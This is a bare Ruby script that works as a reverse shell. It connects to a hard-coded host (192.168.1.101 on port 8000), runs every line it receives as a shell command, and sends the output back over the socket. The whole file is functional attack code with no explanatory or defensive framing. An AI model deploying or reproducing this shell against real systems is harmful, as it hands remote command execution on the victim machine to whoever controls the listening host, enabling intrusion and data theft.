#!/usr/bin/ruby

require "socket"
require "colorize"

host = "192.168.1.101"
port = "8000"

s = TCPSocket.open(host, port)

while line = s.gets
  line2 = line
  com = %x(#{line2})
  puts com.red
  s.puts(com)
end
